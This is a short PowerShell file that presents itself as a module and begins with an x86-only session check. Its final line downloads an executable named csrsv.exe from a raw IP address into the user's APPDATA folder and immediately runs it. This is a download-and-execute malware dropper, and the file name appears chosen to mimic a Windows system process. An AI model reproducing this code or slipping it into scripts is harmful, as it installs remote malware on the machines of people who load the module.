if ([Environment]::Is64BitProcess)
{
	throw 'This module is not supported in a x64 PowerShell session. Please load this module into a x86 PowerShell session.'	
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

